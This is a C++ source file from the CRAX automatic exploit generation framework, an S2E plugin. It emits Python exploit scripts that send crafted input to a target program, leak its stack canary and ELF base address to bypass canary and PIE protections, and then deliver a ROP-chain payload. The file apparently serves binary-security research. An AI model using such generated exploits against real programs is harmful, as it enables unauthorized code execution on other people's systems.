// Copyright 2021-2022 Software Quality Laboratory, NYCU.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <s2e/Plugins/CRAX/CRAX.h>
#include <s2e/Plugins/CRAX/Expr/BinaryExprEvaluator.h>
#include <s2e/Plugins/CRAX/InputStream.h>

#include "LeakBasedCoreGenerator.h"

using namespace klee;

namespace s2e::plugins::crax {

void LeakBasedCoreGenerator::generateMainFunction(S2EExecutionState *state,
                                                  std::vector<RopSubchain> ropChain,
                                                  std::vector<uint8_t> stage1) {
    InputStream is(stage1);
    Exploit &exploit = g_crax->getExploit();
    const auto &checksec = exploit.getElf().getChecksec();

    auto iostates = dynamic_cast<IOStates *>(CRAX::getModule("IOStates"));
    assert(iostates);

    auto modState = g_crax->getPluginModuleState(state, iostates);
    assert(modState);

    for (size_t i = 0; i < modState->stateInfoList.size(); i++) {
        using InputStateInfo = IOStates::InputStateInfo;
        using OutputStateInfo = IOStates::OutputStateInfo;
        exploit.writeline();

        const auto &info = modState->stateInfoList[i];

        if (const auto stateInfo = std::get_if<InputStateInfo>(&info)) {
            if (i != modState->lastInputStateInfoIdx &&
                modState->lastInputStateInfoIdxBeforeFirstSymbolicRip != -1 &&
                i >= modState->lastInputStateInfoIdxBeforeFirstSymbolicRip) {
                exploit.writeline(format("# input state (offset = %d), skipped", stateInfo->offset));

                (void) is.skip(stateInfo->offset);
                continue;
            }

            exploit.writeline(format("# input state (offset = %d)", stateInfo->offset));


            if (i != modState->lastInputStateInfoIdx) {
                llvm::ArrayRef<uint8_t> bytes = is.read(stateInfo->offset);
                std::string byteString = toByteString(bytes.begin(), bytes.end());

                exploit.writeline(format("proc.send(%s)", byteString.c_str()));
                continue;
            }

            exploit.writeline("# input state (rop chain begin)");
            for (size_t j = 0; j < ropChain.size(); j++) {
                if (j == 0) {
                    if (checksec.hasCanary || checksec.hasPIE) {
                        std::string s = format("payload  = solve_stage1(canary, elf_base, '%s')",
                                               modState->toString().c_str());

                        s += format("[%d:", is.getNrBytesRead());

                        if (!is.getNrBytesSkipped()) {
                            s += ']';
                        } else {
                            s += format("%d]", is.getNrBytesConsumed());
                        }

                        exploit.writeline(s);
                        exploit.flushRopPayload();

                    } else if (ropChain[0].size()) {
                        assert(ropChain[0].size() == 1);
                        llvm::ArrayRef<uint8_t> bytes = is.read(stateInfo->offset);
                        std::string s = evaluate<std::string>(ByteVectorExpr::create(bytes));
                        exploit.appendRopPayload(s);
                        exploit.flushRopPayload();
                    }
                } else {
                    for (const ref<Expr> &e : ropChain[j]) {
                        exploit.appendRopPayload(evaluate<std::string>(e));
                    }
                    exploit.flushRopPayload();
                }
            }

        } else if (const auto stateInfo = std::get_if<OutputStateInfo>(&info)) {
            exploit.writeline("# output state");

            if (!stateInfo->valid) {
                exploit.writeline("proc.recvrepeat(0.1)");
                continue;
            }

            exploit.writeline(
                    format("# leaking: %s", IOStates::s_leakTypes[stateInfo->leakType].c_str()));

            if (stateInfo->leakType == IOStates::LeakType::CANARY) {
                exploit.writelines({
                    format("proc.recv(%d)", stateInfo->bufIndex),
                    "canary = u64(b'\\x00' + proc.recv(7))",
                    "log.info('leaked canary: {}'.format(hex(canary)))",
                });
            } else {
                exploit.writelines({
                    format("proc.recv(%d)", stateInfo->bufIndex),
                    "elf_leak = u64(proc.recv(6).ljust(8, b'\\x00'))",
                    format("elf_base = elf_leak - 0x%x", stateInfo->baseOffset),
                    "log.info('leaked elf_base : {}'.format(hex(elf_base)))",
                });
            }
        }
    }
}

}  // namespace s2e::plugins::crax
